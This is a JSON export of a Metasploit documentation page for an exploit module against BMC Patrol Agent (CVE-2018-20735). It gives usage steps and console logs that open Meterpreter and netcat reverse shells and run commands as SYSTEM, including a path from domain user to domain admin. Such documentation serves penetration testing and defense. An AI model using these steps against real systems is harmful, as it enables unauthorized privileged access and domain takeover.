{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/bmc_patrol_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"44646761-4e81-5c55-9fe6-3bcdd5ff6d3a","name":"BMC Patrol Agent Privilege Escalation Cmd Execution","fullname":"exploit/multi/misc/bmc_patrol_cmd_exec","description":"This module leverages the remote command execution feature provided by\n        the BMC Patrol Agent software. It can also be used to escalate privileges\n        on Windows hosts as the software runs as SYSTEM but only verfies that the password\n        of the provided user is correct. This also means if the software is running on a\n        domain controller, it can be used to escalate from a normal domain user to domain\n        admin as SYSTEM on a DC is DA. **WARNING** The windows version of this exploit uses\n        powershell to execute the payload. The powershell version tends to timeout on\n        the first run so it may take multiple tries.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/bmc_patrol_cmd_exec","documentationSlug":"/modules/documentation/exploit/multi/misc/bmc_patrol_cmd_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits the lack of proper authorization checks in the BMC Patrol Agent that allows arbitrary operating system commands to be executed at a higher privilege level than the user being authenticated. The module is simply a ruby implementation of the remote protocol provided by BMC Patrol Agent to execute system commands.</p>\n<p>The vulnerability was identified by Ryan Wincey of <a href=\"https://www.securifera.com/\">Securifera</a> and was assigned <a href=\"https://www.cvedetails.com/cve/CVE-2018-20735/\">CVE-2018-20735</a> Further details can be found at the <a href=\"https://www.securifera.com/blog/2018/12/17/bmc-patrol-agent-domain-user-to-domain-admin/\">Securifera website</a>.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The module affects the BMC Patrol Agent component of <a href=\"https://docs.bmc.com/docs/TSInfrastructure/113/home-774795879.html\">BMC TrueSight Infrastructure Management</a>. The agent is installed on servers managed using BMC TrueSight Infrastructure Management and listens on TCP port 3181. The vulnerability affects versions up to 11.3.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>To use this exploit you will need access to BMC Patrol Agent.</p>\n<ol>\n<li>Install the BMC Patrol agent on a host.</li>\n<li>Ensure that the PatrolAgent service is running and listening on TCP port 3181.</li>\n<li>Launch <code class=\"language-text\">msfconsole</code>.</li>\n<li>Load the module <code class=\"language-text\">use exploit/multi/misc/bmc_patrol_cmd_exec</code>.</li>\n<li>Set the username to authenticate with <code class=\"language-text\">set USER patrol</code>.</li>\n<li>Set the password for the user <code class=\"language-text\">set PASSWORD password</code>.</li>\n<li>Set the command to execute <code class=\"language-text\">set CMD &quot;whoami&quot;</code>.</li>\n<li>Run the exploit <code class=\"language-text\">exploit</code>.</li>\n</ol>\n<p>The result should be that the string <code class=\"language-text\">nt authority\\system</code> is returned and output.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>The exploit module contains several targets as detailed below.</p>\n<h3 id=\"target-0-windows-powershell-injected-shellcode\" style=\"position:relative;\"><a href=\"#target-0-windows-powershell-injected-shellcode\" aria-label=\"target 0 windows powershell injected shellcode permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target 0: Windows Powershell Injected Shellcode</h3>\n<p>This module target provides support for command staging to enable arbitrary Metasploit payloads to be used against Windows targets (for example, a Meterpreter shell). </p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/misc/bmc_patrol_cmd_exec \nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set RHOSTS 192.168.162.133\nRHOSTS =&gt; 192.168.162.133\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set LHOST 192.168.162.128\nLHOST =&gt; 192.168.162.128\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set USER user\nUSER =&gt; user\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set PASSWORD password\nPASSWORD =&gt; password\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; exploit -j\n[*] Exploit running as background job 0.\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; \n[*] Started reverse TCP handler on 192.168.162.128:4444 \n[*] 192.168.162.133:3181 - Connected to BMC Patrol Agent.\n[*] 192.168.162.133:3181 - Successfully authenticated user.\n[*] Sending stage (179779 bytes) to 192.168.162.133\n[*] Meterpreter session 1 opened (192.168.162.128:4444 -&gt; 192.168.162.133:58461) at 2019-02-10 23:00:03 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"target-1-generic-cmd\" style=\"position:relative;\"><a href=\"#target-1-generic-cmd\" aria-label=\"target 1 generic cmd permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target 1: Generic Cmd</h3>\n<p>This target can be used with <em>cmd</em> payloads to execute operating system commands against the target host.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/misc/bmc_patrol_cmd_exec \nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set RHOSTS 192.168.162.130\nRHOSTS =&gt; 192.168.162.130\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set LHOST 192.168.162.128\nLHOST =&gt; 192.168.162.128\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set USER patrol\nUSER =&gt; patrol\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set PASSWORD password\nPASSWORD =&gt; password\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set TARGET 1\nTARGET =&gt; 1\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD =&gt; cmd/unix/reverse_netcat\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; exploit -j\n[*] Exploit running as background job 0.\nmsf5 exploit(multi/misc/bmc_patrol_cmd_exec) &gt; \n[*] Started reverse TCP handler on 192.168.162.128:4444 \n[*] 192.168.162.130:3181 - Connected to BMC Patrol Agent.\n[*] 192.168.162.130:3181 - Successfully authenticated user.\n[*] Command shell session 1 opened (192.168.162.128:4444 -&gt; 192.168.162.130:57408) at 2019-02-10 23:05:12 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"target-cmd-execution-windowsunixlinux\" style=\"position:relative;\"><a href=\"#target-cmd-execution-windowsunixlinux\" aria-label=\"target cmd execution windowsunixlinux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target Cmd Execution: Windows/Unix/Linux</h3>\n<p>This target isn't a formal target. It was added to allow a user to execute commands entirely through the Patrol Agent remote administration feature and view the output. It would be the most quiet of the targets as it does not create any additional connections or use powershell by default like Target 0.\n\nmsf5 > use exploit/multi/misc/bmc<em>patrol</em>cmd<em>exec\nmsf5 exploit(multi/misc/bmc</em>patrol<em>cmd</em>exec) > set RHOSTS 192.168.162.133\nRHOSTS => 192.168.162.133\nmsf5 exploit(multi/misc/bmc<em>patrol</em>cmd<em>exec) > set USER user\nUSER => user\nmsf5 exploit(multi/misc/bmc</em>patrol<em>cmd</em>exec) > set PASSWORD password\nPASSWORD => password\nmsf5 exploit(multi/misc/bmc<em>patrol</em>cmd<em>exec) > set CMD whoami\nmsf5 exploit(multi/misc/bmc</em>patrol<em>cmd</em>exec) > exploit\n[*] 192.168.162.133:3181 - Connected to BMC Patrol Agent.\n[*] 192.168.162.133:3181 - Successfully authenticated user.\n[*] 192.168.162.133:3181 - Command to execute: whoami\n[*] 192.168.162.133:3181 - Output:\nnt authority\\system</p>"}}},"pageContext":{"id":"44646761-4e81-5c55-9fe6-3bcdd5ff6d3a"}}}